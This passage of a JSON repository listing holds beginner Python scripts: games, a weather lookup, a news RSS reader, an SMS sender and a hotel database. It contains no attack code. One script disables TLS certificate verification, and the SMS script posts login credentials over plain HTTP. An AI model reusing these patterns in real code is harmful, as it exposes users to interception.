but it may raise an exception if\nthe server responds with an error to the QUIT command. \n\nThis implies a call to the close() method which renders the FTP instance useless\nfor subsequent calls.\nFTP.close()\n\nClose the connection unilaterally. \n\nThis should not be applied to an already closed connection such as after a \nsuccessful call to quit(). \n\nAfter this call the FTP instance should not be used any more.\n\nAfter a call to close() or quit() you cannot reopen the connection by issuing\nanother login() method).\n"
        },
        {
          "name": "Face and eye Recognition",
          "type": "tree",
          "content": null
        },
        {
          "name": "Face_Mask_detection (haarcascade)",
          "type": "tree",
          "content": null
        },
        {
          "name": "FibonacciNumbersWithGenerators.py",
          "type": "blob",
          "size": 0.3701171875,
          "content": "def fibonacci_generator(n = None):\n    \"\"\"\n        Generating function up to n fibonacci numbers iteratively\n        Params:\n            n: int\n        Return:\n            int\n    \"\"\"\n    f0, f1 = 0, 1\n    yield f1\n    while n == None or n > 1:\n        fn = f0 + f1\n        yield fn\n        f0, f1 = f1, fn\n        n -= 1\n\nfor n_fibo in fibonacci_generator(7):\n    print(n_fibo)\n"
        },
        {
          "name": "Fibonacci_sequence_recursive_sol.py",
          "type": "blob",
          "size": 0.2529296875,
          "content": "def fib(term):\n    if term <= 1:\n        return term\n    else:\n        return fib(term - 1) + fib(term - 2)\n\n\n# Change this value to adjust the number of terms in the sequence.\nnumber_of_terms = int(input())\nfor i in range(number_of_terms):\n    print(fib(i))\n"
        },
        {
          "name": "Find current weather of any city using openweathermap API.py",
          "type": "blob",
          "size": 1.734375,
          "content": "# Python program to find current \n# weather details of any city \n# using openweathermap api \n\n# import required modules \nimport requests, json \n\n# Enter your API key here \napi_key = \"Your_API_Key\"\n\n# base_url variable to store url \nbase_url = \"http://api.openweathermap.org/data/2.5/weather?\"\n\n# Give city name \ncity_name = input(\"Enter city name : \") \n\n# complete_url variable to store \n# complete url address \ncomplete_url = base_url + \"appid=\" + api_key + \"&q=\" + city_name \n\n# get method of requests module \n# return response object \nresponse = requests.get(complete_url) \n\n# json method of response object \n# convert json format data into \n# python format data \nx = response.json() \n\n# Now x contains list of nested dictionaries \n# Check the value of \"cod\" key is equal to \n# \"404\", means city is found otherwise, \n# city is not found \nif x[\"cod\"] != \"404\": \n\n\t# store the value of \"main\" \n\t# key in variable y \n\ty = x[\"main\"] \n\n\t# store the value corresponding \n\t# to the \"temp\" key of y \n\tcurrent_temperature = y[\"temp\"] \n\n\t# store the value corresponding \n\t# to the \"pressure\" key of y \n\tcurrent_pressure = y[\"pressure\"] \n\n\t# store the value corresponding \n\t# to the \"humidity\" key of y \n\tcurrent_humidiy = y[\"humidity\"] \n\n\t# store the value of \"weather\" \n\t# key in variable z \n\tz = x[\"weather\"] \n\n\t# store the value corresponding \n\t# to the \"description\" key at \n\t# the 0th index of z \n\tweather_description = z[0][\"description\"] \n\n\t# print following values \n\tprint(\" Temperature (in kelvin unit) = \" +\n\t\t\t\t\tstr(current_temperature) +\n\t\t\"\\n atmospheric pressure (in hPa unit) = \" +\n\t\t\t\t\tstr(current_pressure) +\n\t\t\"\\n humidity (in percentage) = \" +\n\t\t\t\t\tstr(current_humidiy) +\n\t\t\"\\n description = \" +\n\t\t\t\t\tstr(weather_description)) \n\nelse: \n\tprint(\" City Not Found \") \n"
        },
        {
          "name": "FindingResolutionOfAnImage.py",
          "type": "blob",
          "size": 0.5849609375,
          "content": "def jpeg_res(filename):\n   \"\"\"\"This function prints the resolution of the jpeg image file passed into it\"\"\"\n\n   # open image for reading in binary mode\n   with open(filename,'rb') as img_file:\n\n       # height of image (in 2 bytes) is at 164th position\n       img_file.seek(163)\n\n       # read the 2 bytes\n       a = img_file.read(2)\n\n       # calculate height\n       height = (a[0] << 8) + a[1]\n\n       # next 2 bytes is width\n       a = img_file.read(2)\n\n       # calculate width\n       width = (a[0] << 8) + a[1]\n\n   print(\"The resolution of the image is\",width,\"x\",height)\n\njpeg_res(\"img1.jpg\")\n"
        },
        {
          "name": "FizzBuzz.py",
          "type": "blob",
          "size": 0.6240234375,
          "content": "# FizzBuzz\n# A program that prints the numbers from 1 to num (User given number)!\n# For multiples of ‘3’ print “Fizz” instead of the number.\n# For the multiples of ‘5’ print “Buzz”.\n# If the number is divisible by both 3 and 5 then print \"FizzBuzz\".\n# If none of the given conditions are true then just print the number!\n\n\ndef FizzBuzz(num):\n    for i in range(1, num + 1):\n        if i % 3 == 0 and i % 5 == 0:\n            print(\"FizzBuzz\")\n        elif i % 3 == 0:\n            print(\"Fizz\")\n        elif i % 5 == 0:\n            print(\"Buzz\")\n        else:\n            print(i)\n\n\n\nFizzBuzz(20)  # prints FizzBuzz up to 20\n"
        },
        {
          "name": "Flappy Bird - created with tkinter",
          "type": "tree",
          "content": null
        },
        {
          "name": "Generate a random number between 0 to 9.py",
          "type": "blob",
          "size": 0.1240234375,
          "content": "# Program to generate a random number between 0 and 9\n\n# importing the random module\nimport random\n\nprint(random.randint(0,9))\n"
        },
        {
          "name": "Google_Image_Downloader",
          "type": "tree",
          "content": null
        },
        {
          "name": "Google_News.py",
          "type": "blob",
          "size": 1.1875,
          "content": "import ssl\nfrom urllib.request import urlopen\n\nfrom bs4 import BeautifulSoup as soup\n\n\ndef news(xml_news_url, counter):\n    \"\"\"Print select details from a html response containing xml\n    @param xml_news_url: url to parse\n    \"\"\"\n\n    context = ssl._create_unverified_context()\n    Client = urlopen(xml_news_url, context=context)\n    xml_page = Client.read()\n    Client.close()\n\n    soup_page = soup(xml_page, \"xml\")\n\n    news_list = soup_page.findAll(\"item\")\n    i = 0  # counter to print n number of news items\n\n    for news in news_list:\n        print(f\"news title:   {news.title.text}\")  # to print title of the news\n        print(f\"news link:    {news.link.text}\")  # to print link of the news\n        print(f\"news pubDate: {news.pubDate.text}\")  # to print published date\n        print(\"+-\" * 20, \"\\n\\n\")\n\n        if i == counter:\n            break\n        i = i + 1\n\n\n# you can add google news 'xml' URL here for any country/category\nnews_url = \"https://news.google.com/news/rss/?ned=us&gl=US&hl=en\"\nsports_url = \"https://news.google.com/news/rss/headlines/section/topic/SPORTS.en_in/Sports?ned=in&hl=en-IN&gl=IN\"\n\n# now call news function with any of these url or BOTH\nnews(news_url, 10)\nnews(sports_url, 5)\n"
        },
        {
          "name": "Gregorian_Calendar.py",
          "type": "blob",
          "size": 0.998046875,
          "content": "# An extra day is added to the calendar almost every four years as February 29, and the day is called a leap day. It corrects the calendar for the fact that our planet takes approximately 365.25 days to orbit the sun. A leap year contains a leap day.\n\n# In the Gregorian calendar, three conditions are used to identify leap years:\n\n# The year can be evenly divided by 4, is a leap year, unless:\n# The year can be evenly divided by 100, it is NOT a leap year, unless:\n# The year is also evenly divisible by 400. Then it is a leap year.\n# This means that in the Gregorian calendar, the years 2000 and 2400 are leap years, while 1800, 1900, 2100, 2200, 2300 and 2500 are NOT leap years.\n\n\ndef is_leap(year):\n    leap = False\n    if year % 4 == 0:\n        leap = True\n        if year % 100 == 0:\n            leap = False\n            if year % 400 == 0:\n                leap = True\n    return leap\n\n\nyear = int(input(\"Enter the year here: \"))\nprint(is_leap(year))\n\n# If the given year is a leap year it outputs True else False\n"
        },
        {
          "name": "Grocery calculator.py",
          "type": "blob",
          "size": 1.4501953125,
          "content": "'''This will be a Python script that functions as a grocery calculator. It will take in key-value pairs for items\nand their prices, and return the subtotal and total, and can print out the list for you for when you're ready to\ntake it to the store!'''\n\n'''Algorithm:\n1. User enters key-value pairs that are added into a dict.\n2. Users tells script to return total, subtotal, and key-value pairs in a nicely formatted list.'''\n\n#Object = GroceryList\n#Methods = addToList, Total, Subtotal, returnList\nclass GroceryList(dict):\n\n\tdef __init__(self):\n\t\tself = {}\n\n\tdef addToList(self, item, price):\n        \n\t\tself.update({item:price})\n\n\tdef Total(self):\n\t\ttotal = 0\n\t\tfor items in self:\n\t\t\ttotal += (self[items])*.07 + (self[items])\n\t\treturn total\n\n\tdef Subtotal(self):\n\t\tsubtotal = 0\n\t\tfor items in self:\n\t\t\tsubtotal += self[items]\n\t\treturn subtotal\n\n\tdef returnList(self):\n\t\treturn self\n\n'''Test list should return:\nTotal = 10.70\nSubtotal = 10\nreturnList = {\"milk\":4, \"eggs\":3, \"kombucha\":3}\n'''\nList1 = GroceryList()\n\nList1.addToList(\"milk\",4)\nList1.addToList(\"eggs\", 3)\nList1.addToList(\"kombucha\", 3)\n\n\nprint(List1.Total())\nprint(List1.Subtotal())\nprint(List1.returnList())\n\n#*****************************************************\nprint()\n#*****************************************************\n\n\nList2 = GroceryList()\n\nList2.addToList('cheese', 7.49)\nList2.addToList('wine', 25.36)\nList2.addToList('steak', 17.64)\n\nprint(List2.Total())\nprint(List2.Subtotal())\nprint(List2.returnList())\n"
        },
        {
          "name": "GroupSms_Way2.py",
          "type": "blob",
          "size": 1.5234375,
          "content": "from __future__ import print_function\n\nimport sys\nfrom getpass import getpass\n\nimport cookielib\nimport urllib2\n\ntry:\n    input = raw_input\nexcept NameError:\n    pass\n\nusername = input(\"Enter mobile number:\")\npasswd = getpass()\nmessage = input(\"Enter Message:\")\n# Fill the list with Recipients\nx = input(\"Enter Mobile numbers seperated with comma:\")\nnum = x.split(\",\")\nmessage = \"+\".join(message.split(\" \"))\n\n# Logging into the SMS Site\nurl = \"http://site24.way2sms.com/Login1.action?\"\ndata = \"username={0}&password={1}&Submit=Sign+in\".format(username, passwd)\n\n# For Cookies:\ncj = cookielib.CookieJar()\nopener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))\n\n# Adding Header detail:\nopener.addheaders = [\n    (\n        \"User-Agent\",\n        \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 \"\n        \"Safari/537.36\",\n    )\n]\n\ntry:\n    usock = opener.open(url, data)\nexcept IOError:\n    print(\"Error while logging in.\")\n    sys.exit(1)\n\njession_id = str(cj).split(\"~\")[1].split(\" \")[0]\nsend_sms_url = \"http://site24.way2sms.com/smstoss.action?\"\n\nopener.addheaders = [\n    (\"Referer\", \"http://site25.way2sms.com/sendSMS?Token=%s\" % jession_id)\n]\n\ntry:\n    for number in num:\n        send_sms_data = (\n            \"ssaction=ss&Token={0}&mobile={1}&message={2}&msgLen=136\".format(\n                jession_id, number, message\n            )\n        )\n        sms_sent_page = opener.open(send_sms_url, send_sms_data)\nexcept IOError:\n    print(\"Error while sending message\")\n\nprint(\"SMS has been sent.\")\nsys.exit(1)\n"
        },
        {
          "name": "Guess_the_number_game.py",
          "type": "blob",
          "size": 0.783203125,
          "content": "# using codeSkulpter\n\nimport random\n\nimport simplegui\n\n\ndef new_game():\n    global num\n    print(\"new game starts\")\n\n\ndef range_of_100():\n    global num\n    num = random.randrange(0, 100)\n    print(\"your range is 0-100\")\n\n\ndef range_of_1000():\n    global num\n    num = random.randrange(0, 1000)\n    print(\"Your range is 0-1000\")\n\n\ndef input_guess(guess):\n    global num\n    print(\"Your Guess is \", guess)\n    num1 = int(guess)\n    if num1 == num:\n        print(\"Correct\")\n    elif num1 >= num:\n        print(\"Greater\")\n    elif num1 <= num:\n        print(\"Lower\")\n\n\nframe = simplegui.create_frame(\"Guess The Number\", 200, 200)\nframe.add_button(\"range[0-1000)\", range_of_1000)\nframe.add_button(\"range[0-100)\", range_of_100)\nframe.add_input(\"enter your guess\", input_guess, 200)\nframe.start()\nnew_game()\n"
        },
        {
          "name": "Guessing_Game.py",
          "type": "blob",
          "size": 3.0556640625,
          "content": "from random import randint\nfrom time import sleep\n\n\ndef guessing_game(GUESS_RANGE, GUESS_LIMIT):\n    # Set the initial values.\n    RANDOM = randint(1, GUESS_RANGE)\n    GUESS = int(input(\"What is your guess? \"))\n    ATTEMPTS_ALLOWED = GUESS_LIMIT\n    done = False\n\n    # Validate the inputted guess.\n    GUESS = InputValidation(GUESS, GUESS_RANGE)\n\n    # Now we have a valid guess.\n    while GUESS_LIMIT > 0 and not done:\n        GUESS_LIMIT -= 1  # Take one guess = lose one chance\n        if GUESS_LIMIT > 0:\n            if GUESS < RANDOM:\n                print(f\"It should be higher than {GUESS}.\")\n            elif GUESS > RANDOM:\n                print(f\"It should be lower than {GUESS}.\")\n            else:\n                ATTEMPTS_TOOK = ATTEMPTS_ALLOWED - GUESS_LIMIT\n                print(f\"You nailed it! And it only took you {ATTEMPTS_TOOK} attempts.\")\n                done = True\n            if GUESS_LIMIT > 0 and not done:\n                print(f\"You still have {GUESS_LIMIT} chances left.\\n\")\n                GUESS = int(input(\"Try a new guess: \"))\n                # Another input validation loop.\n                GUESS = InputValidation(GUESS, GUESS_RANGE)\n        elif GUESS_LIMIT == 0 and not done:  # Last chance to guess\n            if GUESS == RANDOM:\n                print(\n                    f\"You nailed it! However, it took you all the {ATTEMPTS_ALLOWED} attempts.\"\n                )\n            else:\n                print(\n                    f\"GAME OVER! It took you more than {ATTEMPTS_ALLOWED} attempts. \"\n                    f\"The correct number is {RANDOM}.\"\n                )\n\n\ndef InputValidation(GUESS, GUESS_RANGE):\n    while not 1 <= GUESS <= GUESS_RANGE:\n        print(\"TRY AGAIN! Your guess is out of range!\\n\")\n        GUESS = int(input(\"What is your guess? \"))\n    return GUESS\n\n\ndef easy():\n    print(\"You are to guess a number between 1 and 10 in no more than 6 attempts.\")\n    guessing_game(10, 6)\n\n\ndef medium():\n    print(\"You are to guess a number between 1 and 20 in no more than 4 attempts.\")\n    guessing_game(20, 4)\n\n\ndef hard():\n    print(\"You are to guess a number between 1 and 50 in no more than 3 attempts.\")\n    guessing_game(50, 3)\n\n\ndef try_again():\n    print()\n    again = input(\"Do you want to play again? (yes/no) \")\n    if again.lower() in [\"y\", \"yes\"]:\n        welcome()\n    elif again.lower() in [\"n\", \"no\"]:\n        print(\"Thanks for playing the game\")\n    else:\n        print(\"INVALID VALUE\")\n        try_again()\n\n\ndef welcome():\n    print(\"Hello, Welcome to the Guessing Game!\")\n    name = input(\"I'm Geek! What's Your Name? \")\n    sleep(1)\n\n    print(f\"Okay, {name}. Let's Begin The Guessing Game!\")\n    print(\n        \"Choose a level:\",\n        \"1. Easy\",\n        \"2. Medium\",\n        \"3. Hard\",\n        sep=\"\\n\",\n    )\n    sleep(1)\n    level = int(input(\"Pick a number: \"))\n    print()\n    sleep(1)\n    if level == 1:\n        easy()\n        try_again()\n    elif level == 2:\n        medium()\n        try_again()\n    elif level == 3:\n        hard()\n        try_again()\n    else:\n        print(\"INVALID VALUE! Please try again.\\n\")\n        welcome()\n\n\nwelcome()\n"
        },
        {
          "name": "Hand-Motion-Detection",
          "type": "tree",
          "content": null
        },
        {
          "name": "HangMan Game",
          "type": "blob",
          "size": 2.4814453125,
          "content": "# Program for HangMan Game.\nimport random, HangMan_Includes as incl\n\nwhile True:\n\tchances=6\n\tinp_lst=[]\n\tresult_lst=[]\n\tname=random.choice(incl.names).upper()\n\t# print(name)\n\t[result_lst.append('__ ') for i in range(len(name))]\n\tresult_str=str().join(result_lst)\n\n\tprint(f'\\nYou have to Guess a Human Name of {len(name)} Alphabets:\\t{result_str}')\n\tprint(incl.draw[0])\n\n\twhile True:\n\t\tif result_str.replace(' ','')==name:\n\t\t\tprint(f'\\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Correct Answer: {name} ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')\n\t\t\tprint(incl.won+'\\a')\n\t\t\tbreak\n\t\tinp=input('\\nGuess an Alphabet or a Sequence of Alphabets: ').upper()\n\t\t\n\t\tif inp in inp_lst:\n\t\t\tprint('......................................................................Already Tried')\n\t\t\tcontinue\n\t\telse:\n\t\t\tinp_lst.append(inp)\n\t\t\n\t\tt=0\n\t\tindx=[]\n\t\tif inp in name:\n\t\t\ttemp=name\n\t\t\twhile temp!='':\n\t\t\t\tif inp in temp:\n\t\t\t\t\tindx.append(t+temp.index(inp))\n\t\t\t\t\tt=temp.index(inp)+1\n\t\t\t\t\ttemp=temp[t:]\n\t\t\t\telse:\n\t\t\t\t\tbreak\n\t\t\t\n\t\t\tfor j in range(len(indx)):\n\t\t\t\tfor i in range(len(inp)):\n\t\t\t\t\tresult_lst[indx[j]]=inp[i]+' '\n\t\t\t\t\tindx[j]+=1\n\t\t\t\t\ti+=1\n\t\t\t\n\t\t\tresult_str=str().join(result_lst)\n\t\t\tprint('\\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Excellent~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')\n\t\t\tprint(f'\\nYou have to Guess a Human Name of {len(name)} Alphabets:\\t{result_str}\\n')\n\t\t\tprint('Tried Inputs:',tuple(sorted(set(inp_lst))))\n\n\t\telse:\n\t\t\tprint('\\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Try Again!!!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')\n\t\t\tprint(f'\\nYou have to Guess a Human Name of {len(name)} Alphabets:\\t{result_str}\\n')\n\t\t\tprint(incl.draw[chances])\n\t\t\tchances=chances-1\n\t\t\t\n\t\t\tif chances!=0:\n\t\t\t\tprint('Tried Inputs:',tuple(sorted(set(inp_lst))))\n\t\t\t\tprint(f'\\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~You were left with {chances} Chances~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')\n\t\t\telse:\n\t\t\t\tprint(f'\\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Correct Answer: {name} ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')\n\t\t\t\tprint(incl.lose+'\\a')\n\t\t\t\tbreak\n\t\n\ttry:\n\t\tif int(input('To play the Game Again Press \"1\" & \"0\" to Quit: '))!=1:\n\t\t\texit('\\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Thank You~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')\n\texcept:\n\t\texit('\\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Thank You~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')\n"
        },
        {
          "name": "Hangman.py",
          "type": "blob",
          "size": 2.1640625,
          "content": "# importing the time module\nimport time\n\n# importing the random module\nimport random\n\n# welcoming the user\nname = input(\"What is your name? \")\n\nprint(\"\\nHello, \" + name + \"\\nTime to play hangman!\\n\")\n\n# wait for 1 second\ntime.sleep(1)\n\nprint(\"Start guessing...\\nHint:It is a fruit\")\ntime.sleep(0.5)\n\nsomeWords = \"\"\"apple banana mango strawberry  \norange grape pineapple apricot lemon coconut watermelon \ncherry papaya berry peach lychee muskmelon\"\"\"\n\nsomeWords = someWords.split(\" \")\n# randomly choose a secret word from our \"someWords\" LIST.\nword = random.choice(someWords)\n\n# creates an variable with an empty value\nguesses = \"\"\n\n# determine the number of turns\nturns = 5\n\n# Create a while loop\n\n# check if the turns are more than zero\nwhile turns > 0:\n\n    # make a counter that starts with zero\n    failed = 0\n\n    # for every character in secret_word\n    for char in word:\n\n        # see if the character is in the players guess\n        if char in guesses:\n\n            # print then out the character\n            print(char, end=\" \")\n\n        else:\n\n            # if not found, print a dash\n            print(\"_\", end=\" \")\n\n            # and increase the failed counter with one\n            failed += 1\n\n    # if failed is equal to zero\n\n    # print You Won\n    if failed == 0:\n        print(\"\\nYou won\")\n\n        # exit the script\n        break\n\n    print\n\n    # ask the user go guess a character\n    guess = input(\"\\nGuess a character:\")\n\n    # Validation of the guess\n    if not guess.isalpha():\n        print(\"Enter only a LETTER\")\n        continue\n    elif len(guess) > 1:\n        print(\"Enter only a SINGLE letter\")\n        continue\n    elif guess in guesses:\n        print(\"You have already guessed that letter\")\n        continue\n\n    # set the players guess to guesses\n    guesses += guess\n\n    # if the guess is not found in the secret word\n    if guess not in word:\n\n        # turns counter decreases with 1 (now 9)\n        turns -= 1\n\n        # print wrong\n        print(\"\\nWrong\")\n\n        # how many turns are left\n        print(\"You have\", +turns, \"more guesses\\n\")\n\n        # if the turns are equal to zero\n        if turns == 0:\n\n            # print \"You Loose\"\n            print(\"\\nYou Loose\")\n"
        },
        {
          "name": "Hotel-Management.py",
          "type": "blob",
          "size": 9.3876953125,
          "content": "\ndef menu():\n\n    options = {\n        1 : {\n            \"title\" : \"Add new customer details\", \n            \"method\": lambda : add()\n            },\n\n        2 : {\n            \"title\" : \"Modify already existing customer details\", \n            \"method\": lambda : modify()\n            },\n\n        3 : {\n            \"title\" : \"Search customer details\", \n            \"method\": lambda : search()\n            },\n\n        4 : {\n            \"title\" : \"View all customer details\", \n            \"method\": lambda : view()\n            },\n\n        5 : {\n            \"title\" : \"Delete customer details\", \n            \"method\": lambda : remove()\n            },\n\n        6 : {\n            \"title\" : \"Exit the program\", \n            \"method\": lambda : exit()\n            }\n    }\n\n    print(f\"\\n\\n{' '*25}Welcome to Hotel Database Management Software\\n\\n\")\n\n    for num, option in options.items():\n        print(f\"{num}: {option.get('title')}\")\n    print()\n\n    options.get( int(input(\"Enter your choice(1-6): \")) ).get(\"method\")()\n\n\ndef add():\n\n    Name1 = input(\"\\nEnter your first name: \\n\")\n    Name2 = input(\"\\nEnter your last name: \\n\")\n    Phone_Num = input(\"\\nEnter your phone number(without +91): \\n\")\n\n    print(\"These are the rooms that are currently available\")\n    print(\"1-Normal (500/Day)\")\n    print(\"2-Deluxe (1000/Day)\")\n    print(\"3-Super Deluxe (1500/Day)\")\n    print(\"4-Premium Deluxe (2000/Day)\")\n\n    Room_Type = int(input(\"\\nWhich type you want(1-4): \\n\"))\n\n    match Room_Type:\n        case 1:\n            x = 500\n            Room_Type = \"Normal\"\n        case 2:\n            x = 1000\n            Room_Type = \"Deluxe\"\n        case 3:\n            x = 1500\n            Room_Type = \"Super Deluxe\"\n        case 4:\n            x = 2000\n            Room_Type = \"Premium\"\n\n    Days = int(input(\"How many days you will stay: \"))\n    Money = x * Days\n    Money = str(Money)\n    print(\"\")\n\n    print(\"You have to pay \", (Money))\n    print(\"\")\n\n    Payment = input(\"Mode of payment(Card/Cash/Online): \").capitalize()\n    if Payment == \"Card\":\n        print(\"Payment with card\")\n    elif Payment == \"Cash\":\n        print(\"Payment with cash\")\n    elif Payment == \"Online\":\n        print(\"Online payment\")\n    print(\"\")\n\n    with open(\"Management.txt\", \"r\") as File:\n        string = File.read()\n        string = string.replace(\"'\", '\"')\n        dictionary = json.loads(string)\n\n    if len(dictionary.get(\"Room\")) == 0:\n        Room_num = \"501\"\n    else:\n        listt = dictionary.get(\"Room\")\n        tempp = len(listt) - 1\n        temppp = int(listt[tempp])\n        Room_num = 1 + temppp\n        Room_num = str(Room_num)\n\n    print(\"You have been assigned Room Number\", Room_num)\n    print(f\"name : {Name1} {Name2}\")\n    print(f\"phone number : +91{Phone_Num}\")\n    print(f\"Room type : {Room_Type}\")\n    print(f\"Stay (day) : {Days}\")\n\n    dictionary[\"First_Name\"].append(Name1)\n    dictionary[\"Last_Name\"].append(Name2)\n    dictionary[\"Phone_num\"].append(Phone_Num)\n    dictionary[\"Room_Type\"].append(Room_Type)\n    dictionary[\"Days\"].append(Days)\n    dictionary[\"Price\"].append(Money)\n    dictionary[\"Room\"].append(Room_num)\n\n    with open(\"Management.txt\", \"w\", encoding=\"utf-8\") as File:\n        File.write(str(dictionary))\n\n    print(\"\\nYour data has been successfully added to our database.\")\n\n    exit_menu()\n\n\nimport os\nimport json\n\nfilecheck = os.path.isfile(\"Management.txt\")\nif not filecheck:\n    with open(\"Management.txt\", \"a\", encoding=\"utf-8\") as File:\n        temp1 = {\n            \"First_Name\": [],\n            \"Last_Name\": [],\n            \"Phone_num\": [],\n            \"Room_Type\": [],\n            \"Days\": [],\n            \"Price\": [],\n            \"Room\": [],\n        }\n        File.write(str(temp1))\n\n\ndef modify():\n\n    with open(\"Management.txt\", \"r\") as File:\n        string = File.read()\n        string = string.replace(\"'\", '\"')\n        dictionary = json.loads(string)\n\n    dict_num = dictionary.get(\"Room\")\n    dict_len = len(dict_num)\n    if dict_len == 0:\n        print(\"\\nThere is no data in our database\\n\")\n        menu()\n    else:\n        Room = input(\"\\nEnter your Room Number: \")\n\n        listt = dictionary[\"Room\"]\n        index = int(listt.index(Room))\n\n        print(\"\\n1-Change your first name\")\n        print(\"2-Change your last name\")\n        print(\"3-Change your phone number\")\n\n        choice = int(input(\"\\nEnter your choice: \"))\n        print()\n\n        with open(\"Management.txt\", \"w\", encoding=\"utf-8\") as File:\n            \n            match choice:\n                case 1:\n                    category = \"First_Name\"\n                case 2:\n                    category = \"Last_Name\"\n                case 3:\n                    category = \"Phone_num\"\n\n            user_input = input(f\"Enter New {category.replace('_', ' ')}\")\n            listt1 = dictionary[category]\n            listt1[index] = user_input\n            dictionary[category] = None\n            dictionary[category] = listt1\n\n            File.write(str(dictionary))\n\n        print(\"\\nYour data has been successfully updated\")\n        exit_menu()\n\n\ndef search():\n\n    with open(\"Management.txt\") as File:\n        dictionary = json.loads(File.read().replace(\"'\", '\"'))\n\n    dict_num = dictionary.get(\"Room\")\n    dict_len = len(dict_num)\n\n    if dict_len == 0:\n        print(\"\\nThere is no data in our database\\n\")\n        menu()\n    else:\n        Room = input(\"\\nEnter your Room Number: \")\n\n        listt_num = dictionary.get(\"Room\")\n        index = int(listt_num.index(Room))\n\n        listt_fname = dictionary.get(\"First_Name\")\n        listt_lname = dictionary.get(\"Last_Name\")\n        listt_phone = dictionary.get(\"Phone_num\")\n        listt_type = dictionary.get(\"Room_Type\")\n        listt_days = dictionary.get(\"Days\")\n        listt_price = dictionary.get(\"Price\")\n\n        print(f\"\\nFirst Name: {listt_fname[index]}\")\n        print(f\"Last Name: {listt_lname[index]}\")\n        print(f\"Phone number: {listt_phone[index]}\")\n        print(f\"Room Type: {listt_type[index]}\")\n        print(f\"Days staying: {listt_days[index]}\")\n        print(f\"Money paid: {listt_price[index]}\")\n        print(f\"Room Number: {listt_num[index]}\")\n\n        exit_menu()\n\n\ndef remove():\n    with open(\"Management.txt\") as File:\n        dictionary = json.loads(File.read().replace(\"'\", '\"'))\n\n    dict_num = dictionary.get(\"Room\")\n    dict_len = len(dict_num)\n    if dict_len == 0:\n        print(\"\\nThere is no data in our database\\n\")\n        menu()\n    else:\n        Room = input(\"\\nEnter your Room Number: \")\n\n        listt = dictionary[\"Room\"]\n        index = int(listt.index(Room))\n\n        listt_fname = dictionary.get(\"First_Name\")\n        listt_lname = dictionary.get(\"Last_Name\")\n        listt_phone = dictionary.get(\"Phone_num\")\n        listt_type = dictionary.get(\"Room_Type\")\n        listt_days = dictionary.get(\"Days\")\n        listt_price = dictionary.get(\"Price\")\n        listt_num = dictionary.get(\"Room\")\n\n        del listt_fname[index]\n        del listt_lname[index]\n        del listt_phone[index]\n        del listt_type[index]\n        del listt_days[index]\n        del listt_price[index]\n        del listt_num[index]\n\n        dictionary[\"First_Name\"] = None\n        dictionary[\"First_Name\"] = listt_fname\n\n        dictionary[\"Last_Name\"] = None\n        dictionary[\"Last_Name\"] = listt_lname\n\n        dictionary[\"Phone_num\"] = None\n        dictionary[\"Phone_num\"] = listt_phone\n\n        dictionary[\"Room_Type\"] = None\n        dictionary[\"Room_Type\"] = listt_type\n\n        dictionary[\"Days\"] = None\n        dictionary[\"Days\"] = listt_days\n\n        dictionary[\"Price\"] = None\n        dictionary[\"Price\"] = listt_price\n\n        dictionary[\"Room\"] = None\n        dictionary[\"Room\"] = listt_num\n\n        with open(\"Management.txt\", \"w\", encoding=\"utf-8\") as file1:\n            file1.write(str(dictionary))\n\n        print(\"Details has been removed successfully\")\n\n        exit_menu()\n\n\ndef view():\n\n    with open(\"Management.txt\") as File:\n        dictionary = json.loads(File.read().replace(\"'\", '\"'))\n\n    dict_num = dictionary.get(\"Room\")\n    dict_len = len(dict_num)\n    if dict_len == 0:\n        print(\"\\nThere is no data in our database\\n\")\n        menu()\n\n    else:\n        listt = dictionary[\"Room\"]\n        a = len(listt)\n\n        index = 0\n        while index != a:\n            listt_fname = dictionary.get(\"First_Name\")\n            listt_lname = dictionary.get(\"Last_Name\")\n            listt_phone = dictionary.get(\"Phone_num\")\n            listt_type = dictionary.get(\"Room_Type\")\n            listt_days = dictionary.get(\"Days\")\n            listt_price = dictionary.get(\"Price\")\n            listt_num = dictionary.get(\"Room\")\n\n            print(\"\")\n            print(\"First Name:\", listt_fname[index])\n            print(\"Last Name:\", listt_lname[index])\n            print(\"Phone number:\", listt_phone[index])\n            print(\"Room Type:\", listt_type[index])\n            print(\"Days staying:\", listt_days[index])\n            print(\"Money paid:\", listt_price[index])\n            print(\"Room Number:\", listt_num[index])\n            print(\"\")\n\n            index = index + 1\n\n        exit_menu()\n\n\ndef exit():\n    print(\"\")\n    print(\"                             Thanks for visiting\")\n    print(\"                                 Goodbye\")\n\n\ndef exit_menu():\n    print(\"\")\n    print(\"Do you want to exit the program or return to main menu\")\n    print(\"1-Main Menu\")\n    print(\"2-Exit\")\n    print(\"\")\n\n    user_input = int(input(\"Enter your choice: \"))\n    if user_input == 2:\n        exit()\n    elif user_input == 1:\n        menu()\n\n\ntry:\n    menu()\nexcept KeyboardInterrupt as exit:\n    print(\"\\nexiting...!\")\n\n# menu()\n"
        },
        {
          "name": "ImageDownloader",
          "type": "tree",
          "content": null
        },
        {
          "name": "Image_resize.py",
